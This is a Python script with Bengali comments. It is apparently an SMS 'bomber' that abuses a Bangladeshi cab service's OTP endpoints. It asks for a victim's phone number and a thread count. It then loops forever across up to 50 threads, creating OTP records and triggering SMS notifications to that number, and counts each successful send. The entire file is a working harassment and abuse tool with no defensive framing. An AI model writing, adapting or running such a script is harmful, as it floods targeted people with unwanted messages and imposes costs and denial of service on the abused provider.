import requests
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

def send_otp_request(mobile_number):
    """
    POST এবং GET রিকোয়েস্টের মাধ্যমে OTP পাঠানো।
    """
    global total_requests

    # POST রিকোয়েস্ট URL এবং ডেটা
    url = "https://bdcabs.com/api/userotp/post"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    data = {
        "MobileNo": mobile_number[-10:],  # শেষের ১০ ডিজিট
        "MobileNumber": f"880{mobile_number[-10:]}",  # ফরম্যাট: 880xxxxxxxxxx
        "CountryCode": "880",
        "Status": "101",
        "OTPCode": ""
    }

    try:
        # POST রিকোয়েস্ট পাঠানো
        response = requests.post(url, json=data, headers=headers)
        response_data = response.json()
        
        # Response থেকে OTP ID বের করা
        user_otp = response_data.get("ResponseData", {}).get("UserOTP", {})
        otp_id = user_otp.get("Id")

        if not otp_id:
            print(f"[api_7] OTP ID not found for {mobile_number}.")
            return

        # GET রিকোয়েস্ট URL
        get_url = f"https://bdcabs.com/api/userotp/sendotpnotification?otpId={otp_id}"

        # GET রিকোয়েস্ট পাঠানো
        get_response = requests.get(get_url, headers=headers)
        if get_response.status_code == 200:
            total_requests += 1
            print(f"[api_7] [{total_requests}] OTP sent successfully for {mobile_number}.")
        else:
            print(f"[api_7] Failed to send OTP for {mobile_number}.")
    except Exception as e:
        print(f"[api_7] Error: {e}")

def main(mobile, threads):
    """
    প্রধান ফাংশন: একাধিক থ্রেডে OTP রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    # মোবাইল নম্বর যাচাই করা (১১ ডিজিটের)
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    # মাল্টিথ্রেডিং দিয়ে OTP রিকোয়েস্ট পাঠানো
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_otp_request, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)